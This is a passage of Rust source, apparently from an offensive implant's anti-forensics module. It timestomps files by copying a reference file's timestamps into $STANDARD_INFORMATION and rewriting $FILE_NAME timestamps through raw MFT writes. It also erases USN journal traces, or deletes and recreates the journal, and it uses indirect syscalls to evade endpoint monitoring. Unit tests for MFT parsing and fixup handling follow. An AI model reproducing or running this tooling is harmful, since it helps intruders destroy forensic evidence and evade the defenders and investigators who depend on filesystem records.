    // FSCTL_QUERY_USN_JOURNAL = 0x000900F4
    let mut output = [0u8; 64];
    let _iosb = nt_fs_control_file(
        volume_handle,
        0x000900F4, // FSCTL_QUERY_USN_JOURNAL
        std::ptr::null_mut(),
        0,
        output.as_mut_ptr() as *mut std::ffi::c_void,
        output.len() as u32,
    )?;

    // USN_JOURNAL_DATA layout:
    //   +0x00: UsnJournalID (u64)
    //   +0x08: FirstUsn (i64)
    //   +0x10: NextUsn (i64)
    //   +0x18: LowestValidUsn (i64)
    //   +0x20: MaxUsn (i64)
    //   +0x28: MaximumSize (u64)
    //   +0x30: AllocationDelta (u64)
    if output.len() >= 8 {
        Ok(u64::from_le_bytes([
            output[0], output[1], output[2], output[3],
            output[4], output[5], output[6], output[7],
        ]))
    } else {
        Err("USN journal query returned insufficient data".to_string())
    }
}

/// Read USN journal entries and collect file reference numbers for files
/// matching the given path.  Returns a vector of (file_ref, usn) pairs.
unsafe fn find_usn_entries_for_file(
    volume_handle: *mut std::ffi::c_void,
    target_file_ref: u64,
) -> Result<Vec<(u64, i64)>, String> {
    let mut entries = Vec::new();
    let mut journal_buf = vec![0u8; USN_JOURNAL_BUF_SIZE];

    // First query the journal to get the journal ID.
    let journal_id = match query_usn_journal_id(volume_handle) {
        Ok(id) => id,
        Err(e) => {
            log::debug!("timestamps: could not query USN journal ID: {}", e);
            return Ok(entries); // Non-fatal.
        }
    };

    let reason_mask = USN_REASON_DATA_OVERWRITE
        | USN_REASON_FILE_CREATE
        | USN_REASON_FILE_DELETE
        | USN_REASON_BASIC_INFO_CHANGE
        | USN_REASON_RENAME_OLD_NAME
        | USN_REASON_RENAME_NEW_NAME
        | USN_REASON_CLOSE;

    let mut current_usn: i64 = 0;

    for _ in 0..MAX_USN_ITERATIONS {
        let mut read_data = ReadUsnJournalData {
            start_usn: current_usn,
            reason_mask,
            return_only_on_close: 0,
            timeout: 0,
            bytes_to_wait_for: 0,
            usn_journal_id: journal_id,
            min_major_version: 2,
            max_major_version: 4,
        };

        let mut iosb = IoStatusBlock::default();

        let read_status = syscall!(
            "NtFsControlFile",
            volume_handle as u64,
            0u64,
            0u64,
            0u64,
            &mut iosb as *mut _ as u64,
            FSCTL_READ_USN_JOURNAL as u64,
            &mut read_data as *mut _ as u64,
            std::mem::size_of::<ReadUsnJournalData>() as u64,
            journal_buf.as_mut_ptr() as u64,
            USN_JOURNAL_BUF_SIZE as u64,
        )
        .map_err(|e| format!("nt_syscall resolution for FSCTL_READ_USN_JOURNAL: {e}"))?;

        if read_status != STATUS_SUCCESS {
            log::debug!(
                "timestamps: USN journal read returned NTSTATUS {:#010X}",
                read_status as u32
            );
            break;
        }

        let bytes_returned = iosb.information as usize;
        if bytes_returned < 8 {
            break;
        }

        // First 8 bytes = next USN.
        current_usn = i64::from_le_bytes([
            journal_buf[0], journal_buf[1], journal_buf[2], journal_buf[3],
            journal_buf[4], journal_buf[5], journal_buf[6], journal_buf[7],
        ]);

        if current_usn == 0 {
            break;
        }

        // Parse USN records starting at offset 8.
        let mut record_offset: usize = 8;
        while record_offset + 32 < bytes_returned {
            let rec_ptr = journal_buf.as_ptr().add(record_offset);
            let record_length = u32::from_le_bytes(std::slice::from_raw_parts(rec_ptr, 4).try_into().unwrap_or([0u8; 4])) as usize;

            if record_length == 0 || record_offset + record_length > bytes_returned {
                break;
            }

            // Parse the common fields.
            if record_length >= 32 {
                let file_ref = u64::from_le_bytes(std::slice::from_raw_parts(rec_ptr.add(8), 8).try_into().unwrap_or([0u8; 8]));
                let usn = i64::from_le_bytes(std::slice::from_raw_parts(rec_ptr.add(24), 8).try_into().unwrap_or([0u8; 8]));

                // Compare with target — mask off the sequence number (lower 48 bits = record number).
                let ref_record_number = file_ref & 0x0000FFFFFFFFFFFF;
                let target_record_number = target_file_ref & 0x0000FFFFFFFFFFFF;

                if ref_record_number == target_record_number {
                    entries.push((file_ref, usn));
                }
            }

            record_offset += record_length;
            // Align to 8-byte boundary.
            record_offset = (record_offset + 7) & !7;
        }
    }

    Ok(entries)
}

/// Clean USN journal entries for a specific file by writing USN close records.
unsafe fn clean_usn_entries(
    volume_handle: *mut std::ffi::c_void,
    target_file_ref: u64,
) -> Result<usize, String> {
    let entries = find_usn_entries_for_file(volume_handle, target_file_ref)?;
    let mut cleaned = 0usize;

    for (_file_ref, usn) in &entries {
        // FSCTL_WRITE_USN_CLOSE_RECORD writes a USN_CLOSE record which
        // cleanly marks the entry as closed, preventing forensic recovery.
        let mut iosb = IoStatusBlock::default();

        let status = syscall!(
            "NtFsControlFile",
            volume_handle as u64,
            0u64,
            0u64,
            0u64,
            &mut iosb as *mut _ as u64,
            FSCTL_WRITE_USN_CLOSE as u64,
            &target_file_ref as *const u64 as *mut std::ffi::c_void as u64,
            8u64,  // input size
            std::ptr::null_mut::<std::ffi::c_void>(),
            0u64,
        )
        .map_err(|e| format!("nt_syscall resolution for FSCTL_WRITE_USN_CLOSE: {e}"))?;

        if status == STATUS_SUCCESS {
            cleaned += 1;
        } else {
            log::debug!(
                "timestamps: FSCTL_WRITE_USN_CLOSE returned NTSTATUS {:#010X} for USN {}",
                status as u32, usn
            );
        }
    }

    log::debug!("timestamps: cleaned {} USN journal entries for file ref {:#018X}", cleaned, target_file_ref);
    Ok(cleaned)
}

/// Delete and recreate the USN journal as a fallback cleanup method.
/// Preserves the journal ID if possible.
unsafe fn recreate_usn_journal(volume_handle: *mut std::ffi::c_void) -> Result<(), String> {
    // Query the current journal to get its ID.
    let journal_id = query_usn_journal_id(volume_handle).unwrap_or(0);

    // Delete the journal.
    let delete_data = DeleteUsnJournalData {
        usn_journal_id: journal_id,
        delete_flags: 0x00000001, // USN_DELETE_FLAG_DELETE
    };

    let _ = nt_fs_control_file(
        volume_handle,
        FSCTL_DELETE_USN_JOURNAL,
        &delete_data as *const DeleteUsnJournalData as *mut std::ffi::c_void,
        std::mem::size_of::<DeleteUsnJournalData>() as u32,
        std::ptr::null_mut(),
        0,
    );

    // Recreate with default size (32 MB max, 4 MB delta).
    let create_data = CreateUsnJournalData {
        maximum_size: 32 * 1024 * 1024,
        allocation_delta: 4 * 1024 * 1024,
    };

    let _ = nt_fs_control_file(
        volume_handle,
        FSCTL_CREATE_USN_JOURNAL,
        &create_data as *const CreateUsnJournalData as *mut std::ffi::c_void,
        std::mem::size_of::<CreateUsnJournalData>() as u32,
        std::ptr::null_mut(),
        0,
    );

    log::debug!("timestamps: recreated USN journal (old ID={:#018X})", journal_id);
    Ok(())
}

// ── Public API ───────────────────────────────────────────────────────────

/// Initialise the timestamps module from configuration.
/// Must be called once during agent startup.
pub fn init_from_config(cfg: &TimestampConfig) {
    if INITIALIZED.load(Ordering::Acquire) {
        return;
    }
    let _ = CONFIG.set(cfg.clone());
    INITIALIZED.store(true, Ordering::Release);
    log::info!(
        "timestamps: initialised (sync_si_fn={}, usn_cleanup={}, ref={})",
        cfg.sync_si_and_fn,
        cfg.usn_cleanup,
        cfg.reference_file
    );
}

/// Check if the module is initialised and enabled.
pub fn is_enabled() -> bool {
    INITIALIZED.load(Ordering::Acquire)
        && CONFIG
            .get()
            .map(|c| c.enabled)
            .unwrap_or(false)
}

/// Timestomp a single file: set all 8 timestamps (4 in $SI + 4 in $FN)
/// to match the reference file's timestamps.
///
/// # Arguments
/// * `file_path` — Target file path in NT format (e.g. `\??\C:\path\to\file`).
/// * `reference_path` — Reference file whose timestamps will be used as cover.
///
/// # Safety
/// All NT API calls use indirect syscalls.  The caller must ensure the
/// paths are valid NT-format UTF-16 strings with null terminators.
pub unsafe fn timestomp_file(file_path: &[u16], reference_path: &[u16]) -> Result<(), String> {
    // ── Step 1: Read reference file timestamps ───────────────────────

    let ref_handle = nt_open_file(
        reference_path,
        GENERIC_READ | SYNCHRONIZE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
    )?;
    defer!({ let _ = nt_close(ref_handle); });

    let ref_info = nt_query_basic_info(ref_handle)?;
    log::debug!(
        "timestamps: reference file times — creation={:#018X}, access={:#018X}, write={:#018X}, change={:#018X}",
        ref_info.creation_time as u64, ref_info.last_access_time as u64,
        ref_info.last_write_time as u64, ref_info.change_time as u64
    );

    // ── Step 2: Patch $STANDARD_INFORMATION timestamps ───────────────

    let target_handle = nt_open_file(
        file_path,
        GENERIC_WRITE | SYNCHRONIZE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
    )?;
    defer!({ let _ = nt_close(target_handle); });

    // Build the new basic info with cover timestamps.
    let mut new_info = FileBasicInformation {
        creation_time: ref_info.creation_time,
        last_access_time: ref_info.last_access_time,
        last_write_time: ref_info.last_write_time,
        change_time: ref_info.change_time,
        file_attributes: 0, // 0 = don't change attributes
    };

    nt_set_basic_info(target_handle, &new_info)?;
    log::debug!("timestamps: patched $STANDARD_INFORMATION timestamps");

    // ── Step 3: Optionally patch $FILE_NAME timestamps ───────────────

    let cfg = CONFIG.get();
    let sync_fn = cfg.map(|c| c.sync_si_and_fn).unwrap_or(true);

    if sync_fn {
        // Get the MFT record number for the target file.
        let mft_record_number = nt_query_internal_info(target_handle)?;
        log::debug!("timestamps: target MFT record number = {}", mft_record_number);

        // Open the volume handle for raw MFT access.
        let volume_handle = nt_open_file(
            DEFAULT_VOLUME_NT,
            GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
            FILE_OPEN,
            FILE_SYNCHRONOUS_IO_NONALERT | FILE_WRITE_THROUGH | FILE_NO_INTERMEDIATE_BUFFERING,
        )?;

        // Best-effort: if volume open fails, skip $FN patching.
        if !volume_handle.is_null() {
            defer!({ let _ = nt_close(volume_handle); });

            match patch_fn_via_mft(
                volume_handle,
                mft_record_number,
                ref_info.creation_time,
                ref_info.last_write_time,
                ref_info.change_time,
                ref_info.last_access_time,
            ) {
                Ok(true) => log::debug!("timestamps: patched $FILE_NAME timestamps via MFT"),
                Ok(false) => log::warn!("timestamps: could not patch $FILE_NAME (attribute not found or out of bounds)"),
                Err(e) => log::warn!("timestamps: $FILE_NAME patch failed: {}", e),
            }

            // ── Step 4: Clean USN journal ────────────────────────────
            let do_usn_cleanup = cfg.map(|c| c.usn_cleanup).unwrap_or(true);
            if do_usn_cleanup {
                let file_ref = (mft_record_number as u64) & 0x0000FFFFFFFFFFFF;
                match clean_usn_entries(volume_handle, file_ref) {
                    Ok(n) => log::debug!("timestamps: cleaned {} USN journal entries", n),
                    Err(e) => log::warn!("timestamps: USN cleanup failed: {}", e),
                }
            }
        } else {
            log::warn!("timestamps: could not open volume handle for $FN patching and USN cleanup");
        }
    }

    log::info!("timestamps: timestomp complete for {}", wide_to_string(file_path));
    Ok(())
}

/// Internal helper: patch $FILE_NAME timestamps via raw MFT record access.
unsafe fn patch_fn_via_mft(
    volume_handle: *mut std::ffi::c_void,
    mft_record_number: i64,
    creation_time: i64,
    last_write_time: i64,
    change_time: i64,
    last_access_time: i64,
) -> Result<bool, String> {
    // Read the raw MFT record.
    let mut record = read_mft_record(volume_handle, mft_record_number)?;

    // Remove fixup values so we can work with the raw content.
    remove_mft_fixup(&mut record)?;

    // Patch the $FILE_NAME timestamps.
    let patched = patch_fn_timestamps(
        &mut record,
        creation_time,
        last_write_time,
        change_time,
        last_access_time,
    )?;

    if !patched {
        return Ok(false);
    }

    // Re-apply fixup values.
    apply_mft_fixup(&mut record)?;

    // Write the record back.
    write_mft_record(volume_handle, mft_record_number, &record)?;

    Ok(true)
}

/// Timestomp all files in a directory: enumerate and timestomp each one.
///
/// # Arguments
/// * `dir_path` — Directory path in NT format.
/// * `reference_path` — Reference file whose timestamps will be used.
pub unsafe fn timestomp_directory(dir_path: &[u16], reference_path: &[u16]) -> Result<usize, String> {
    let dir_handle = nt_open_file(
        dir_path,
        GENERIC_READ | SYNCHRONIZE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT | 0x00000001, // FILE_DIRECTORY_FILE
    )?;
    defer!({ let _ = nt_close(dir_handle); });

    let files = nt_enumerate_files(dir_handle)?;
    let mut stomped = 0usize;
    let mut errors = 0usize;

    let dir_str = wide_to_string(dir_path);

    for file_name in &files {
        // Build full NT path: dir_path + "\" + filename.
        let mut full_path: Vec<u16> = dir_path.to_vec();
        // Remove null terminator for concatenation.
        if full_path.last() == Some(&0) {
            full_path.pop();
        }
        full_path.push(b'\\' as u16);
        full_path.extend_from_slice(file_name);
        full_path.push(0); // Null terminator.

        let file_str = wide_to_string(&full_path);
        log::debug!("timestamps: timestomping {}", file_str);

        match timestomp_file(&full_path, reference_path) {
            Ok(()) => stomped += 1,
            Err(e) => {
                log::warn!("timestamps: failed to timestomp {}: {}", file_str, e);
                errors += 1;
            }
        }
    }

    log::info!(
        "timestamps: directory timestomp complete for {} ({} files, {} errors)",
        dir_str, stomped, errors
    );
    Ok(stomped)
}

/// Clean USN journal entries for a volume.
///
/// Reads the USN journal, finds entries referencing modified files, and
/// writes close records.  Fallback: delete and recreate the journal,
/// preserving the journal ID.
///
/// # Arguments
/// * `volume` — NT path to the volume (e.g. `\??\C:`).
pub unsafe fn clean_usn_journal(volume: &[u16]) -> Result<(), String> {
    let volume_handle = nt_open_file(
        volume,
        GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
    )?;
    defer!({ let _ = nt_close(volume_handle); });

    // Try the clean approach: write close records for all recent entries.
    // We don't have a specific file ref, so we attempt a full journal cleanup
    // by recreating it.
    match recreate_usn_journal(volume_handle) {
        Ok(()) => {
            log::info!("timestamps: USN journal recreated successfully");
            Ok(())
        }
        Err(e) => {
            log::warn!("timestamps: USN journal recreation failed: {}", e);
            Err(e)
        }
    }
}

/// Public API: synchronise timestamps for a file with cover times from
/// a reference file, including USN journal cleanup.
///
/// This is the main entry point for post-operation timestamp cleanup.
/// It combines:
///   1. $SI timestomp via NtSetInformationFile
///   2. $FN timestomp via raw MFT access (if configured)
///   3. USN journal cleanup (if configured)
///
/// # Arguments
/// * `file_path` — Target file path in NT format.
/// * `reference_path` — Reference file whose timestamps will be used.
pub unsafe fn sync_timestamps(file_path: &[u16], reference_path: &[u16]) -> Result<(), String> {
    if !is_enabled() {
        log::debug!("timestamps: sync_timestamps called but module not enabled, skipping");
        return Ok(());
    }

    log::debug!(
        "timestamps: sync_timestamps — target={}, ref={}",
        wide_to_string(file_path),
        wide_to_string(reference_path)
    );

    timestomp_file(file_path, reference_path)
}

/// Convenience wrapper: sync timestamps using the configured reference file.
///
/// # Arguments
/// * `file_path` — Target file path in NT format.
pub unsafe fn sync_timestamps_with_default_ref(file_path: &[u16]) -> Result<(), String> {
    let cfg = CONFIG.get().ok_or("timestamps module not initialised")?;
    let ref_path = to_nt_path(&cfg.reference_file);
    sync_timestamps(file_path, &ref_path)
}

// ── Tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_to_wide() {
        let wide = to_wide("C:\\Windows\\System32\\ntdll.dll");
        assert_eq!(wide.last(), Some(&0u16));
        assert!(wide.len() > 0);
    }

    #[test]
    fn test_wide_to_string() {
        let wide: Vec<u16> = "Hello World".encode_utf16().collect();
        assert_eq!(wide_to_string(&wide), "Hello World");
    }

    #[test]
    fn test_to_nt_path() {
        let nt = to_nt_path("C:\\Windows\\test.dll");
        let s = wide_to_string(&nt);
        assert!(s.starts_with("\\??\\C:\\Windows\\test.dll"));
    }

    #[test]
    fn test_ensure_nt_path() {
        // Already NT path.
        let nt: Vec<u16> = "\\??\\C:\\test.dll".encode_utf16().chain(std::iter::once(0)).collect();
        let result = ensure_nt_path(&nt);
        assert_eq!(wide_to_string(&result), wide_to_string(&nt));

        // Non-NT path gets prefix added.
        let plain: Vec<u16> = "C:\\test.dll".encode_utf16().chain(std::iter::once(0)).collect();
        let result = ensure_nt_path(&plain);
        let s = wide_to_string(&result);
        assert!(s.starts_with("\\???"));
    }

    #[test]
    fn test_find_mft_attribute_too_short() {
        let record = [0u8; 10];
        assert!(find_mft_attribute(&record, ATTR_TYPE_FILE_NAME).is_none());
    }

    #[test]
    fn test_find_mft_attribute_bad_signature() {
        let mut record = vec![0u8; MFT_RECORD_SIZE];
        record[0..4].copy_from_slice(b"BAAD");
        assert!(find_mft_attribute(&record, ATTR_TYPE_FILE_NAME).is_none());
    }

    #[test]
    fn test_find_mft_attribute_valid_empty() {
        let mut record = vec![0u8; MFT_RECORD_SIZE];
        record[0..4].copy_from_slice(&MFT_RECORD_SIGNATURE);
        // Set first attribute offset.
        let attr_offset = 56u16;
        record[0x14..0x16].copy_from_slice(&attr_offset.to_le_bytes());
        // Place end marker at the attribute offset.
        if attr_offset as usize + 4 <= record.len() {
            record[attr_offset as usize..attr_offset as usize + 4]
                .copy_from_slice(&ATTR_TYPE_END.to_le_bytes());
        }
        // No $FILE_NAME attribute → should return None.
        assert!(find_mft_attribute(&record, ATTR_TYPE_FILE_NAME).is_none());
    }

    #[test]
    fn test_find_mft_attribute_with_filename() {
        let mut record = vec![0u8; MFT_RECORD_SIZE];
        record[0..4].copy_from_slice(&MFT_RECORD_SIGNATURE);

        let attr_offset = 56u16;
        record[0x14..0x16].copy_from_slice(&attr_offset.to_le_bytes());

        // Place a $FILE_NAME attribute (type 0x30) at attr_offset.
        let offset = attr_offset as usize;
        // Type = 0x30
        record[offset..offset + 4].copy_from_slice(&ATTR_TYPE_FILE_NAME.to_le_bytes());
        // TotalLength = 80 (reasonable for a $FN attribute)
        record[offset + 4..offset + 8].copy_from_slice(&80u32.to_le_bytes());
        // NonResident = 0
        record[offset + 8] = 0;
        // ContentLength = 60
        record[offset + 0x10..offset + 0x14].copy_from_slice(&60u32.to_le_bytes());
        // ContentOffset = 24 (from attribute start)
        record[offset + 0x14..offset + 0x16].copy_from_slice(&24u16.to_le_bytes());

        let result = find_mft_attribute(&record, ATTR_TYPE_FILE_NAME);
        assert!(result.is_some());
        let (a_off, c_off, c_len) = result.unwrap();
        assert_eq!(a_off, offset);
        assert_eq!(c_off, 24);
        assert_eq!(c_len, 60);
    }

    #[test]
    fn test_patch_fn_timestamps() {
        let mut record = vec![0u8; MFT_RECORD_SIZE];
        record[0..4].copy_from_slice(&MFT_RECORD_SIGNATURE);

        let attr_offset = 56u16;
        record[0x14..0x16].copy_from_slice(&attr_offset.to_le_bytes());

        let offset = attr_offset as usize;
        record[offset..offset + 4].copy_from_slice(&ATTR_TYPE_FILE_NAME.to_le_bytes());
        record[offset + 4..offset + 8].copy_from_slice(&80u32.to_le_bytes());
        record[offset + 8] = 0; // resident
        record[offset + 0x10..offset + 0x14].copy_from_slice(&60u32.to_le_bytes());
        record[offset + 0x14..offset + 0x16].copy_from_slice(&24u16.to_le_bytes());

        let creation: i64 = 0x01DB123456789ABC;
        let last_write: i64 = 0x01DBDEADBEEF1234;
        let change: i64 = 0x01DBCAFEBABE5678;
        let last_access: i64 = 0x01DB0000DEADBEEF;

        let result = patch_fn_timestamps(&mut record, creation, last_write, change, last_access);
        assert_eq!(result.unwrap(), true);

        let fn_content_start = offset + 24;
        // Verify all 4 timestamps were written correctly.
        assert_eq!(
            i64::from_le_bytes(record[fn_content_start + 0x08..fn_content_start + 0x10].try_into().unwrap()),
            creation
        );
        assert_eq!(
            i64::from_le_bytes(record[fn_content_start + 0x10..fn_content_start + 0x18].try_into().unwrap()),
            last_write
        );
        assert_eq!(
            i64::from_le_bytes(record[fn_content_start + 0x18..fn_content_start + 0x20].try_into().unwrap()),
            change
        );
        assert_eq!(
            i64::from_le_bytes(record[fn_content_start + 0x20..fn_content_start + 0x28].try_into().unwrap()),
            last_access
        );
    }

    #[test]
    fn test_remove_apply_fixup_roundtrip() {
        let mut record = vec![0u8; MFT_RECORD_SIZE];
        record[0..4].copy_from_slice(&MFT_RECORD_SIGNATURE);

        // Set fixup offset and count.
        let fixup_offset = 48u16;
        let fixup_count = 3u16; // 1 signature + 2 sectors (for 1024-byte record)
        record[0x04..0x06].copy_from_slice(&fixup_offset.to_le_bytes());
        record[0x06..0x08].copy_from_slice(&fixup_count.to_le_bytes());

        // Write a fixup signature.
        let signature = 0x4242u16;
        record[fixup_offset as usize] = (signature & 0xFF) as u8;
        record[fixup_offset as usize + 1] = ((signature >> 8) & 0xFF) as u8;

        // Store original bytes in fixup array.
        record[fixup_offset as usize + 2] = 0xAA;
        record[fixup_offset as usize + 3] = 0xBB;
        record[fixup_offset as usize + 4] = 0xCC;
        record[fixup_offset as usize + 5] = 0xDD;

        // Write the signature at sector boundaries.
        let sec1_boundary = 512 - 2;
        record[sec1_boundary] = (signature & 0xFF) as u8;
        record[sec1_boundary + 1] = ((signature >> 8) & 0xFF) as u8;

        let sec2_boundary = 1024 - 2;
        record[sec2_boundary] = (signature & 0xFF) as u8;
        record[sec2_boundary + 1] = ((signature >> 8) & 0xFF) as u8;

        // Remove fixup — should restore originals.
        remove_mft_fixup(&mut record).unwrap();

        // Sector boundaries should now have original values.
        assert_eq!(record[sec1_boundary], 0xAA);
        assert_eq!(record[sec1_boundary + 1], 0xBB);
        assert_eq!(record[sec2_boundary], 0xCC);
        assert_eq!(record[sec2_boundary + 1], 0xDD);

        // Re-apply fixup.
        apply_mft_fixup(&mut record).unwrap();

        // Sector boundaries should have the new signature.
        let new_sig = u16::from_le_bytes([record[fixup_offset as usize], record[fixup_offset as usize + 1]]);
        let sec1_val = u16::from_le_bytes([record[sec1_boundary], record[sec1_boundary + 1]]);
        let sec2_val = u16::from_le_bytes([record[sec2_boundary], record[sec2_boundary + 1]]);
        assert_eq!(sec1_val, new_sig);
        assert_eq!(sec2_val, new_sig);
    }
}
